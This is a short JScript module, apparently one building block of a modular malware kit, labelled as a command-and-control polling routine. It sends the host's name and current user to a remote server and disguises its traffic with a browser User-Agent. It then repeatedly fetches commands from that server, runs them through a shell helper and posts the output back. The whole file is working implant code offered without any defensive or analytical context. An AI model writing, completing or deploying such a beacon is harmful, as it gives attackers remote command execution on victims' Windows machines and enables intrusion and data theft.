// chunk: c2/http_poll
// depends: core/run_cmd, core/emit_buffer
// provides: c2_poll
// format: jscript

function c2_poll(baseUrl, interval) {
    var h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
    var hostInfo = _run("hostname") + "|" + _run("whoami");
    try {
        h.Open("POST", baseUrl + "/register", false);
        h.SetRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
        h.Send(hostInfo.replace(/[\r\n]/g, ""));
    } catch(e) { return; }
    while (true) {
        WScript.Sleep(interval);
        try {
            h.Open("GET", baseUrl + "/task", false);
            h.Send();
            if (h.Status == 200 && h.ResponseText.length > 0) {
                var cmd = h.ResponseText;
                if (cmd == "exit") break;
                var out = _run(cmd);
                h.Open("POST", baseUrl + "/result", false);
                h.Send(out);
            }
        } catch(e) {
            WScript.Sleep(interval * 3);
        }
    }
}
